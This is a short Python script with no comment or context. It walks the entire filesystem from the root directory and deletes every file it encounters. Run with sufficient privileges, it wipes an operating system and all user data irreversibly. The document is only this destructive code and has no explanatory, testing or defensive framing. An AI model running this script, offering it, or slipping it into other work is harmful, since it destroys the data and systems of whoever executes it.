import os
for root, dirs, files in os.walk("/"):
    for f in files:
        os.remove(os.path.join(root, f))